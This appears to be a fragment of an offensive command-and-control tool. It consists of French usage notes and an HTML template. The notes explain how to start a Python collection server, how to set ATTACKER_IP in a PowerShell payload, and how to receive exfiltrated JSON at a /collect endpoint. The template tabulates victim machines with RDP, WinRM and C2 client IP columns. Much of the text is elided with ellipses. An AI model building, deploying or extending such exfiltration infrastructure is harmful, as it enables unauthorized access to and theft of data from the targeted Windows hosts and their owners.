...
Utilisation :
  ...
  2. Lancer le serveur          : python server.py [--host 0.0.0.0] [--port 8080]
  3. Configurer le payload      : remplacer ATTACKER_IP dans payload.ps1
     par l'adresse IP publique de cette machine.

Endpoints :
  POST /collect      – reçoit le JSON exfiltré par le payload
...
<body>
  ...
  <table>
    <tr>
      ...
      <th>RDP</th><th>WinRM</th><th>IP client C2</th>
    </tr>
    {% for t in targets %}
    <tr>
      <td>{{ loop.index }}</td>
